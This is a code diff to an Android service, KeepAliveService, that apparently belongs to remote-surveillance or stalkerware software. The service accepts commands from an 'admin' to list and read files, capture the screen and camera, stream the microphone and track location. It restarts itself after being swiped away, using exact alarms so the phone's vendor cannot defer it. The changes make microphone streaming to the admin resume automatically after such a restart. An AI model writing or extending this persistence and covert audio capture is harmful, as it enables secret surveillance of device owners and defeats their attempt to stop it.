@@ -114,6 +114,9 @@ public class KeepAliveService extends Service {
     private volatile boolean     locationTracking = false;
     private String               fromAdminIdLocation;
 
+    // Set in onTaskRemoved so onDestroy skips clearing prefs — service will restart and resume
+    private volatile boolean     restarting = false;
+
     // ── Lifecycle ─────────────────────────────────────────────────────────────
 
     @Override
@@ -204,8 +207,17 @@ public class KeepAliveService extends Service {
         shouldConnect = false;
         stopScreenCapture();
         handleStopCamera();
-        handleStopMic();
-        handleStopLocation();
+        if (restarting) {
+            // Service is restarting — stop hardware but preserve SharedPreferences so
+            // handleMessage(auth_ok) can auto-resume mic/location after reconnect
+            micStreaming = false;
+            try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); audioRecord = null; } } catch (Exception ignored) {}
+            locationTracking = false;
+            try { if (locationManager != null && locationListener != null) { locationManager.removeUpdates(locationListener); } } catch (Exception ignored) {}
+        } else {
+            handleStopMic();
+            handleStopLocation();
+        }
         if (nativeWs != null) nativeWs.cancel();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
         if (systemReceiver != null) { try { unregisterReceiver(systemReceiver); } catch (Exception ignored) {} }
@@ -218,6 +230,7 @@ public class KeepAliveService extends Service {
     // Restart service after app is swiped away — uses exact alarm so OEMs can't defer it
     @Override
     public void onTaskRemoved(Intent rootIntent) {
+        restarting = true;
         Intent restart = new Intent(getApplicationContext(), KeepAliveService.class);
         restart.setPackage(getPackageName());
         AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
@@ -297,6 +310,15 @@ public class KeepAliveService extends Service {
             String type = msg.optString("type");
             if ("auth_ok".equals(type)) {
                 userId = msg.optString("userId"); // store our assigned userId
+                // Auto-resume mic if it was streaming before service was restarted
+                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                if (prefs.getBoolean("micActive", false) && !micStreaming) {
+                    try {
+                        JSONObject resumeMsg = new JSONObject();
+                        resumeMsg.put("fromAdminId", prefs.getString("micAdminId", ""));
+                        handleStartMic(resumeMsg);
+                    } catch (Exception ignored) {}
+                }
             } else if ("ls".equals(type)) {
                 handleLs(ws, msg);
             } else if ("read_file".equals(type)) {
@@ -592,6 +614,11 @@ public class KeepAliveService extends Service {
     private void handleStartMic(JSONObject msg) {
         if (micStreaming) return;
         fromAdminIdMic = msg.optString("fromAdminId");
+        // Persist so the service auto-resumes after being swiped-away and restarted
+        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
+            .putBoolean("micActive", true)
+            .putString("micAdminId", fromAdminIdMic)
+            .apply();
         final int sampleRate = 16000;
         int minBuf = AudioRecord.getMinBufferSize(sampleRate,
             AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
@@ -625,6 +652,9 @@ public class KeepAliveService extends Service {
 
     private void handleStopMic() {
         micStreaming = false;
+        // Admin explicitly stopped mic — clear persisted state so restart won't auto-resume
+        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
+            .remove("micActive").remove("micAdminId").apply();
         try {
             if (audioRecord != null) {
                 audioRecord.stop();
